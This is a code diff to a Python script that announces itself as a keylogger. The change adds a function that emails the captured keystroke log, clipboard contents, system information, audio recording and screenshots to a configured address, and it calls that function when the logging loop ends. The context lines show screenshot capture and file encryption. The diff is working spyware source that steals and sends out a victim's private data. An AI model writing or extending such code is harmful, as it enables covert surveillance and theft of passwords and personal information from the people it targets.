@@ -159,6 +159,12 @@ def screenshot():
 	image = ImageGrab.grab()
 	image.save(image_file_path)
 
+def send_files_via_emails():
+	files_to_send = [log_file_path, clipboard_path, system_info_path, audio_file_path, image_file_path]
+	for file in files_to_send:
+		send_email(file, file, toAddress)
+
+
 def on_release(key):
 	# break loop on pressing esc
 	if key == Key.esc :
@@ -166,7 +172,7 @@ def on_release(key):
 		write_system_info()
 		copy_clipboard()
 		screenshot()
-		send_email("log.txt", log_file_path, toAddress)
+		send_files_via_emails()
 		encrypt_files()
 		return False
 
@@ -185,7 +191,6 @@ def encrypt_files():
             f.write(encrypted)
         
         enc_idx += 1
-
 
 print("Keylogger Started...")
 
